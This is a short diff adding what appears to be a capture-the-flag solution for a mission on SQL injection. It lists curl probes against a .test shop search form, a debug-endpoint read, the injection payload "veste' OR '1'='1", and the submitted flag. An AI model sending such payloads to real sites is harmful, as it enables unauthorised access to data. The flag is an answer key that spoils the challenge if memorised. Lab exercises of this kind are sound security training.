@@ -1,0 +1,7 @@
+# Season 3, mission 2: one quote too many
+curl -d "q=veste" https://shop.pelican.test/search
+curl -d "q=veste'" https://shop.pelican.test/search
+curl https://shop.pelican.test/debug/last-query
+curl -d "q=veste' OR '1'='1" https://shop.pelican.test/search
+submit FLAG{pelican-quote-9d42}
+answer code
